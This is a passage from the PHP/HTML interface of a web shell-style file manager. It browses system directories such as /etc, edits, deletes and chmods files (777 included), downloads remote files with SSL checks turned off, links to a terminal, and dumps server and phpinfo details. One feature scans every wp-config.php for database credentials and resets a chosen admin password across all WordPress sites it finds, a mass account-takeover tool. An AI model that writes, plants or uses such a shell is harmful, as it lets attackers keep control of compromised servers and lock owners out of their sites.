      </div>

      <div class="table-wrap" style="margin-top:12px">
        <form id="bulkForm" method="POST">
          <table>
            <thead>
              <tr>
                <th style="width:30px">
                  <input type="checkbox" class="bulk-checkbox bulk-select-all" id="selectAll" onclick="toggleAllSelection()">
                </th>
                <th>Name</th>
                <th>Type</th>
                <th>Permissions</th>
                <th>Size</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              <?php 
              $files = @scandir($dir);
              if ($files === false) $files = [];
              foreach ($files as $f): 
                  if ($f=='.' || $f=='..') continue; 
                  $p = $dir . DIRECTORY_SEPARATOR . $f; 
              ?>
              <tr>
                <td>
                  <input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>" onchange="updateBulkSelection()">
                </td>
                <td class="filename"><?=esc($f)?></td>
                <td class="filetype"><?=is_dir($p) ? '📁 Folder' : '📄 File'?></td>
                <td class="perms"><?=get_permissions_color($p)?></td>
                <td class="kv"><?=is_file($p) ? hfs(@filesize($p)) : '-'?></td>
                <td style="white-space:nowrap">
                  <?php if (is_dir($p)): ?>
                    <a href="?dir=<?=urlencode($p)?>" style="text-decoration:none"><button class="action-btn" type="button">📂 Open</button></a>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete folder <?=esc($f)?> and all contents?')">🗑</button>
                    </form>
                  <?php else: ?>
                    <a href="<?=esc($p)?>" download style="text-decoration:none"><button class="action-btn" type="button">⬇ DL</button></a>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="view_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="margin-left:6px">✏️ Edit</button>
                    </form>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="del_file" value="<?=esc($p)?>" />
                      <button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete file <?=esc($f)?>?')">🗑</button>
                    </form>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
          <!-- Hidden fields for bulk actions -->
          <input type="hidden" id="bulkActionField" name="bulk_action" value="">
          <input type="hidden" id="chmodValueField" name="chmod_value" value="">
          <input type="hidden" id="moveDestField" name="move_dest" value="">
          <input type="hidden" id="copyDestField" name="copy_dest" value="">
          <input type="hidden" id="renamePrefixField" name="rename_prefix" value="">
          <input type="hidden" id="renameSuffixField" name="rename_suffix" value="">
        </form>
      </div>
    </div>
  </div>

  <!-- Editor modal-ish area -->
  <?php if ($file_content !== ''): ?>
  <div class="card editor" id="editorCard">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div><strong>✏️ Editing:</strong> <?=esc(basename($edit_file_path))?></div>
      <div class="small"><?=esc(dirname($edit_file_path))?></div>
    </div>
    <form method="POST" style="margin-top:10px">
      <textarea name="file_content"><?=esc($file_content)?></textarea>
      <input type="hidden" name="save_file_path" value="<?=esc($edit_file_path)?>">
      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:10px">
        <button class="btn-neon" name="save_file" type="submit">💾 Save File</button>
        <a href="?dir=<?=urlencode(dirname($edit_file_path))?>" style="text-decoration:none"><button type="button" class="action-btn" style="background:linear-gradient(90deg,#222,#061023);color:var(--neon-cyan)">← Back</button></a>
      </div>
    </form>
  </div>
  <?php endif; ?>

</div>

<!-- Terminal Button at Bottom -->
<button class="bottom-terminal-btn" onclick="window.location.href='?dir=<?=urlencode($dir)?>&show_terminal=1'">
  💻 Open Terminal
</button>

<!-- ==================== POPUPS ==================== -->

<!-- WordPress Password Changer Popup -->
<?php if (isset($_GET['show_wordpress'])): ?>
<div class="popup-overlay" id="wordpressPopup">
  <div class="popup-content" style="width:700px">
    <div class="popup-header">
      <h4>🔑 WordPress Password Changer</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Mass change WordPress passwords in current directory and subdirectories:
      </p>
      
      <!-- Scan for WordPress Sites -->
      <form method="POST" style="margin-bottom:20px;padding:12px;background:rgba(0,0,0,0.15);border-radius:8px">
        <strong style="color:var(--neon-cyan);display:block;margin-bottom:8px">Step 1: Scan for WordPress Sites</strong>
        <div style="display:flex;gap:8px">
          <input type="hidden" name="wp_action" value="scan">
          <button type="submit" class="btn-neon" style="width:100%">Scan Directory for WordPress Sites</button>
        </div>
      </form>
      
      <?php if(isset($_SESSION['wp_scan_results'])): ?>
      <div style="margin-bottom:20px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Scan Results:</strong>
        <div style="margin-top:8px;color:#cdefff">
          <?=esc($_SESSION['wp_scan_results'])?>
          
          <?php if(!empty($_SESSION['wp_sites'])): ?>
          <div style="margin-top:8px;max-height:150px;overflow:auto;font-family:monospace;font-size:12px;background:#040408;padding:8px;border-radius:4px">
            <strong>Found WordPress installations:</strong><br>
            <?php foreach($_SESSION['wp_sites'] as $site): ?>
            📁 <?=esc($site)?><br>
            <?php endforeach; ?>
          </div>
          <?php endif; ?>
        </div>
      </div>
      <?php endif; ?>
      
      <!-- Change Password Form -->
      <form method="POST" style="margin-bottom:20px;padding:12px;background:rgba(0,0,0,0.15);border-radius:8px">
        <strong style="color:var(--neon-cyan);display:block;margin-bottom:12px">Step 2: Change Password</strong>
        
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Username</label>
          <input type="text" name="wp_username" class="input" placeholder="admin" required>
        </div>
        
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">New Password</label>
          <input type="text" name="wp_password" class="input" placeholder="NewPassword123" required>
        </div>
        
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">Confirm New Password</label>
          <input type="text" name="wp_password_confirm" class="input" placeholder="NewPassword123" required>
        </div>
        
        <input type="hidden" name="wp_action" value="change_password">
        <button type="submit" class="btn-neon" style="width:100%">Change Password in All Found Sites</button>
      </form>
      
      <?php if(isset($_SESSION['wp_change_results'])): ?>
      <div style="margin-bottom:20px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Password Change Results:</strong>
        <div style="margin-top:8px;max-height:200px;overflow:auto;font-family:monospace;font-size:12px;color:#cdefff;background:#040408;padding:8px;border-radius:4px">
          <?php foreach($_SESSION['wp_change_results'] as $result): ?>
          <?=esc($result)?><br>
          <?php endforeach; ?>
        </div>
      </div>
      <?php 
      unset($_SESSION['wp_change_results']);
      unset($_SESSION['wp_scan_results']);
      unset($_SESSION['wp_sites']);
      endif; ?>
      
      <div style="padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan);font-size:13px">⚠️ Important Notes:</strong>
        <ul style="margin:8px 0 0 0;padding-left:18px;color:var(--muted);font-size:12px">
          <li>Will scan current directory and all subdirectories for wp-config.php files</li>
          <li>Works with WordPress MySQL databases</li>
          <li>Database credentials are extracted from wp-config.php</li>
          <li>Changes password for specified username in ALL found WordPress sites</li>
          <li>Use with caution - this is a powerful tool</li>
        </ul>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- URL Upload Popup with Custom Filename -->
<?php if (isset($_GET['show_url_upload'])): ?>
<div class="popup-overlay" id="urlUploadPopup">
  <div class="popup-content" style="width:600px">
    <div class="popup-header">
      <h4>🌐 Upload from URL</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Download a file from URL to current directory:
      </p>
      
      <form method="POST">
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">File URL</label>
          <input type="text" name="url_upload" class="input" placeholder="https://example.com/file.zip" required>
        </div>
        
        <div style="margin-bottom:12px">
          <label style="display:block;font-size:12px;color:var(--neon-cyan);margin-bottom:4px">
            Custom Filename (optional)
            <span style="color:var(--muted);font-size:11px"> - Leave empty to use original filename</span>
          </label>
          <input type="text" name="url_filename" class="input" placeholder="custom_name.zip">
        </div>
        
        <button type="submit" class="btn-neon" style="width:100%">Download File</button>
      </form>
      
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan);font-size:13px">Current Directory:</strong>
        <div style="margin-top:4px;font-size:12px;color:var(--muted)">
          <?=esc($dir)?>
        </div>
        
        <strong style="color:var(--neon-cyan);font-size:13px;display:block;margin-top:8px">Tips:</strong>
        <ul style="margin:8px 0 0 0;padding-left:18px;color:var(--muted);font-size:12px">
          <li>Use direct download links for best results</li>
          <li>Large files may timeout (30 second limit)</li>
          <li>File will be saved with specified or original name</li>
          <li>SSL verification is disabled for compatibility</li>
          <li>Special characters in filenames will be replaced with underscores</li>
        </ul>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Bulk Operations Popup -->
<?php if (isset($_GET['show_bulk_ops'])): ?>
<div class="popup-overlay" id="bulkOpsPopup">
  <div class="popup-content" style="width:600px">
    <div class="popup-header">
      <h4>📦 Bulk Operations</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Select files using checkboxes, then choose an action:
      </p>
      
      <div style="display:grid;grid-template-columns:repeat(2, 1fr);gap:10px;margin-bottom:12px">
        <button class="action-btn" onclick="bulkActionPopup('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">
          🗑 Delete
        </button>
        <button class="action-btn" onclick="bulkActionPopup('unzip')">
          📂 Unzip Files
        </button>
        <button class="action-btn" onclick="showChmodPopup()">
          🔒 Permissions
        </button>
        <button class="action-btn" onclick="showMovePopup()">
          📂 Move
        </button>
        <button class="action-btn" onclick="showCopyPopup()">
          📋 Copy
        </button>
        <button class="action-btn" onclick="showRenamePopup()">
          ✏️ Rename
        </button>
        <button class="action-btn" onclick="selectAllFiles()">
          ✅ Select All
        </button>
        <button class="action-btn" onclick="clearSelection()" style="background:linear-gradient(90deg,#666,#999)">
          ✕ Clear All
        </button>
      </div>
      
      <!-- Chmod Section -->
      <div id="chmodSection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Set Permissions:</strong>
        <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
          <button type="button" class="action-btn" onclick="setChmod('644')" style="font-size:12px">644</button>
          <button type="button" class="action-btn" onclick="setChmod('755')" style="font-size:12px">755</button>
          <button type="button" class="action-btn" onclick="setChmod('777')" style="font-size:12px">777</button>
          <button type="button" class="action-btn" onclick="setChmod('600')" style="font-size:12px">600</button>
        </div>
        <div class="popup-form" style="margin-top:8px">
          <input type="text" id="customChmod" class="input" placeholder="e.g., 755" pattern="[0-7]{3}">
          <button type="button" class="btn-neon" onclick="setCustomChmod()">Apply</button>
        </div>
      </div>
      
      <!-- Move Section -->
      <div id="moveSection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Move to Directory:</strong>
        <div class="popup-form">
          <input type="text" id="moveDest" class="input" placeholder="/path/to/destination" value="<?=esc($dir)?>">
          <button type="button" class="btn-neon" onclick="executeMove()">Move</button>
        </div>
      </div>
      
      <!-- Copy Section -->
      <div id="copySection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Copy to Directory:</strong>
        <div class="popup-form">
          <input type="text" id="copyDest" class="input" placeholder="/path/to/destination" value="<?=esc($dir)?>">
          <button type="button" class="btn-neon" onclick="executeCopy()">Copy</button>
        </div>
      </div>
      
      <!-- Rename Section -->
      <div id="renameSection" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
        <strong style="color:var(--neon-cyan)">Rename Files:</strong>
        <div style="display:flex;gap:8px;margin-top:8px">
          <div style="flex:1">
            <label style="font-size:12px;color:var(--muted)">Add Prefix:</label>
            <input type="text" id="renamePrefix" class="input" placeholder="prefix_" style="margin-top:4px">
          </div>
          <div style="flex:1">
            <label style="font-size:12px;color:var(--muted)">Add Suffix:</label>
            <input type="text" id="renameSuffix" class="input" placeholder="_suffix" style="margin-top:4px">
          </div>
        </div>
        <div style="margin-top:8px;font-size:12px;color:var(--muted)">
          Example: file.txt → <span id="renameExample">file.txt</span>
        </div>
        <button type="button" class="btn-neon" style="margin-top:8px" onclick="executeRename()">Rename Files</button>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Quick Jump Popup -->
<?php if (isset($_GET['show_quick_jump'])): ?>
<div class="popup-overlay" id="quickJumpPopup">
  <div class="popup-content">
    <div class="popup-header">
      <h4>🚀 Quick Jump</h4>
      <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
    </div>
    <div class="popup-body">
      <p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">
        Jump to common directories:
      </p>
      
      <div style="display:grid;grid-template-columns:repeat(3, 1fr);gap:10px;margin-bottom:12px">
        <a href="?dir=/" style="text-decoration:none">
          <button class="action-btn" style="width:100%">📁 Root (/)</button>
        </a>
        <a href="?dir=/home" style="text-decoration:none">
          <button class="action-btn" style="width:100%">🏠 /home</button>
        </a>
        <a href="?dir=/var/www" style="text-decoration:none">
          <button class="action-btn" style="width:100%">🌐 /var/www</button>
        </a>
        <a href="?dir=/tmp" style="text-decoration:none">
          <button class="action-btn" style="width:100%">📦 /tmp</button>
        </a>
        <a href="?dir=/etc" style="text-decoration:none">
          <button class="action-btn" style="width:100%">⚙️ /etc</button>
        </a>
        <a href="?dir=/var/log" style="text-decoration:none">
          <button class="action-btn" style="width:100%">📝 /var/log</button>
        </a>
        <a href="?dir=<?=esc(__DIR__)?>" style="text-decoration:none">
          <button class="action-btn" style="width:100%">📂 Script Dir</button>
        </a>
      </div>
      
      <div style="margin-top:14px">
        <strong style="color:var(--neon-cyan)">Custom Path:</strong>
        <form method="GET" class="popup-form">
          <input type="text" name="dir" class="input" placeholder="/custom/path" required>
          <button type="submit" class="btn-neon">Jump</button>
        </form>
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- Server Info Modal -->
<?php if ($show_server_info): ?>
<div class="modal-overlay" id="serverInfoModal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>🖥️ Server Information</h3>
      <a href="?dir=<?=urlencode($dir)?>"><button class="modal-close">×</button></a>
    </div>
    <div class="modal-body">
      <table>
        <tr><td><strong>Server Software</strong></td><td><?=esc($_SERVER['SERVER_SOFTWARE'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Server Name</strong></td><td><?=esc($_SERVER['SERVER_NAME'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Server Address</strong></td><td><?=esc($_SERVER['SERVER_ADDR'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Server Port</strong></td><td><?=esc($_SERVER['SERVER_PORT'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Document Root</strong></td><td><?=esc($_SERVER['DOCUMENT_ROOT'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Remote Address</strong></td><td><?=esc($_SERVER['REMOTE_ADDR'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Request Method</strong></td><td><?=esc($_SERVER['REQUEST_METHOD'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Request URI</strong></td><td><?=esc($_SERVER['REQUEST_URI'] ?? 'N/A')?></td></tr>
        <tr><td><strong>Script Filename</strong></td><td><?=esc($_SERVER['SCRIPT_FILENAME'] ?? 'N/A')?></td></tr>
        <tr><td><strong>PHP Version</strong></td><td><?=esc(PHP_VERSION)?></td></tr>
        <tr><td><strong>Zend Engine</strong></td><td><?=esc(zend_version())?></td></tr>
        <tr><td><strong>PHP SAPI</strong></td><td><?=esc(PHP_SAPI)?></td></tr>
        <tr><td><strong>Max Execution Time</strong></td><td><?=esc(ini_get('max_execution_time'))?> seconds</td></tr>
        <tr><td><strong>Memory Limit</strong></td><td><?=esc(ini_get('memory_limit'))?></td></tr>
        <tr><td><strong>Upload Max Filesize</strong></td><td><?=esc(ini_get('upload_max_filesize'))?></td></tr>
        <tr><td><strong>Post Max Size</strong></td><td><?=esc(ini_get('post_max_size'))?></td></tr>
        <tr><td><strong>Server OS</strong></td><td><?=esc(PHP_OS)?></td></tr>
        <tr><td><strong>Architecture</strong></td><td><?=esc(PHP_INT_SIZE * 8)?>-bit</td></tr>
        <tr><td><strong>Loaded Extensions</strong></td><td><?=esc(implode(', ', get_loaded_extensions()))?></td></tr>
      </table>
    </div>
  </div>
</div>
<?php endif; ?>

<!-- PHP Info Modal -->
<?php if ($show_php_info): ?>
<div class="modal-overlay" id="phpInfoModal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>🐘 PHP Information</h3>
      <a href="?dir=<?=urlencode($dir)?>"><button class="modal-close">×</button></a>
    </div>
    <div class="modal-body">
      <?php
      ob_start();
      phpinfo();
      $phpinfo = ob_get_clean();
      
      // Extract body content only
      $phpinfo = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $phpinfo);
      
      // Clean up some styles
      $phpinfo = str_replace('class="v"', 'style="color: #6df0ff"', $phpinfo);
      $phpinfo = str_replace('class="e"', 'style="background: rgba(109, 240, 255, 0.05)"', $phpinfo);
      $phpinfo = str_replace('class="h"', 'style="color: #ff6b6b; font-weight: bold"', $phpinfo);
      $phpinfo = str_replace('class="center"', 'style="text-align: center"', $phpinfo);
      
      // Remove tables and add our own styling
      $phpinfo = preg_replace('/<table[^>]*>/', '<table style="width:100%;border:none">', $phpinfo);
      $phpinfo = preg_replace('/<tr[^>]*>/', '<tr>', $phpinfo);
      $phpinfo = preg_replace('/<td[^>]*>/', '<td style="padding:8px 12px;border:none">', $phpinfo);
      
      echo $phpinfo;
      ?>
    </div>
  </div>
</div>
<?php endif; ?>

<script>
// ==================== BULK OPERATIONS ====================

let selectedFiles = new Set();

function toggleAllSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox:not(.bulk-select-all)');
    const selectAll = document.getElementById('selectAll');
    const allChecked = selectAll.checked;
    
    checkboxes.forEach(cb => {
        cb.checked = allChecked;
        if(allChecked) {
            selectedFiles.add(cb.value);
        } else {
            selectedFiles.delete(cb.value);
        }
    });
    
    updateBulkSelection();
}

function updateBulkSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox:not(.bulk-select-all)');
    selectedFiles.clear();
    
    checkboxes.forEach(cb => {
        if(cb.checked) {
            selectedFiles.add(cb.value);
        }
    });
    
    const selectedCount = selectedFiles.size;
    const bulkBar = document.getElementById('bulkActionsBar');
    const countSpan = document.getElementById('selectedCount');
    const selectAll = document.getElementById('selectAll');
    
    if(selectedCount > 0) {
        bulkBar.style.display = 'flex';
        countSpan.textContent = selectedCount + ' selected';
        selectAll.checked = checkboxes.length === selectedCount;
    } else {
        bulkBar.style.display = 'none';
        selectAll.checked = false;
    }
}

function clearSelection() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox');
    checkboxes.forEach(cb => cb.checked = false);
    selectedFiles.clear();
    updateBulkSelection();
    alert('Selection cleared.');
}

function bulkAction(action) {
    if(selectedFiles.size === 0) {
        alert('Please select files first!');
        return;
    }
    
    if(action === 'delete' && !confirm(`Delete ${selectedFiles.size} selected item(s)? This cannot be undone!`)) {
        return;
    }
    
    if(action === 'unzip') {
        const zipFiles = Array.from(selectedFiles).filter(f => f.toLowerCase().endsWith('.zip'));
        if(zipFiles.length === 0) {
            alert('No ZIP files selected. Please select .zip files to unzip.');
            return;
        }
        if(!confirm(`Unzip ${zipFiles.length} ZIP file(s)?`)) {
            return;
        }
    }
    
    if(action === 'chmod') {
        const chmod = prompt('Enter permissions (e.g., 755):', '644');
        if(chmod && /^[0-7]{3}$/.test(chmod)) {
            document.getElementById('chmodValueField').value = chmod;
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    if(action === 'move') {
        const dest = prompt('Enter destination directory:', '<?=esc($dir)?>');
        if(dest) {
            document.getElementById('moveDestField').value = dest;
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    if(action === 'copy') {
        const dest = prompt('Enter destination directory:', '<?=esc($dir)?>');
        if(dest) {
            document.getElementById('copyDestField').value = dest;
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    if(action === 'rename') {
        const prefix = prompt('Add prefix (leave empty for none):', '');
        const suffix = prompt('Add suffix (leave empty for none):', '');
        if(prefix !== null && suffix !== null) {
            document.getElementById('renamePrefixField').value = prefix || '';
            document.getElementById('renameSuffixField').value = suffix || '';
            document.getElementById('bulkActionField').value = action;
            document.getElementById('bulkForm').submit();
        }
        return;
    }
    
    document.getElementById('bulkActionField').value = action;
    document.getElementById('bulkForm').submit();
}

// ==================== POPUP FUNCTIONS ====================

function bulkActionPopup(action) {
    if(selectedFiles.size === 0) {
        alert('Please select files first using checkboxes!');
        return;
    }
    
    if(action === 'delete') {
        if(!confirm(`Delete ${selectedFiles.size} selected item(s)? This cannot be undone!`)) return;
        document.getElementById('bulkActionField').value = 'delete';
        document.getElementById('bulkForm').submit();
    } else if(action === 'unzip') {
        const zipFiles = Array.from(selectedFiles).filter(f => f.toLowerCase().endsWith('.zip'));
        if(zipFiles.length === 0) {
            alert('No ZIP files selected. Please select .zip files to unzip.');
            return;
        }
        if(!confirm(`Unzip ${zipFiles.length} ZIP file(s)?`)) return;
        document.getElementById('bulkActionField').value = 'unzip';
        document.getElementById('bulkForm').submit();
    }
}

function showChmodPopup() {
    document.getElementById('chmodSection').style.display = 'block';
    document.getElementById('moveSection').style.display = 'none';
    document.getElementById('copySection').style.display = 'none';
    document.getElementById('renameSection').style.display = 'none';
}

function showMovePopup() {
    document.getElementById('moveSection').style.display = 'block';
    document.getElementById('chmodSection').style.display = 'none';
    document.getElementById('copySection').style.display = 'none';
    document.getElementById('renameSection').style.display = 'none';
}

function showCopyPopup() {
    document.getElementById('copySection').style.display = 'block';
    document.getElementById('chmodSection').style.display = 'none';
    document.getElementById('moveSection').style.display = 'none';
    document.getElementById('renameSection').style.display = 'none';
}

function showRenamePopup() {
    document.getElementById('renameSection').style.display = 'block';
    document.getElementById('chmodSection').style.display = 'none';
    document.getElementById('moveSection').style.display = 'none';
    document.getElementById('copySection').style.display = 'none';
    
    // Update rename example
    updateRenameExample();
    document.getElementById('renamePrefix').addEventListener('input', updateRenameExample);
    document.getElementById('renameSuffix').addEventListener('input', updateRenameExample);
}

function updateRenameExample() {
    const prefix = document.getElementById('renamePrefix').value || '';
    const suffix = document.getElementById('renameSuffix').value || '';
    document.getElementById('renameExample').textContent = prefix + 'file.txt' + suffix;
}

function setChmod(value) {
    document.getElementById('customChmod').value = value;
    setCustomChmod();
}

function setCustomChmod() {
    const chmod = document.getElementById('customChmod').value;
    if(!/^[0-7]{3}$/.test(chmod)) {
        alert('Invalid permission format. Use 3 digits (0-7).');
        return;
    }
    document.getElementById('chmodValueField').value = chmod;
    document.getElementById('bulkActionField').value = 'chmod';
    document.getElementById('bulkForm').submit();
}

function executeMove() {
    const dest = document.getElementById('moveDest').value;
    if(!dest) {
        alert('Please enter destination directory');
        return;
    }
    document.getElementById('moveDestField').value = dest;
    document.getElementById('bulkActionField').value = 'move';
    document.getElementById('bulkForm').submit();
}

function executeCopy() {
    const dest = document.getElementById('copyDest').value;
    if(!dest) {
        alert('Please enter destination directory');
        return;
    }
    document.getElementById('copyDestField').value = dest;
    document.getElementById('bulkActionField').value = 'copy';
    document.getElementById('bulkForm').submit();
}

function executeRename() {
    const prefix = document.getElementById('renamePrefix').value || '';
    const suffix = document.getElementById('renameSuffix').value || '';
    
    if(prefix === '' && suffix === '') {
        alert('Please enter either a prefix or suffix.');
        return;
    }
    
    document.getElementById('renamePrefixField').value = prefix;
    document.getElementById('renameSuffixField').value = suffix;
    document.getElementById('bulkActionField').value = 'rename';
    document.getElementById('bulkForm').submit();
}

function selectAllFiles() {
    const checkboxes = document.querySelectorAll('.bulk-checkbox');
    checkboxes.forEach(cb => cb.checked = true);
    updateBulkSelection();
    alert('All files selected. Now choose a bulk action.');
}

// ==================== UTILITY FUNCTIONS ====================

// Show notifications
function showNotifications() {
    const success = document.getElementById('uploadSuccess');
    const error = document.getElementById('uploadError');
    
    if(success) {
        success.style.display = 'block';
        setTimeout(() => success.style.display = 'none', 5000);
    }
    
    if(error) {
        error.style.display = 'block';
        setTimeout(() => error.style.display = 'none', 5000);
    }
}

// Close modal on ESC key
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        window.location.href = '?dir=<?=urlencode($dir)?>';
    }
});

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    updateBulkSelection();
    showNotifications();
});
</script>
</body>
</html>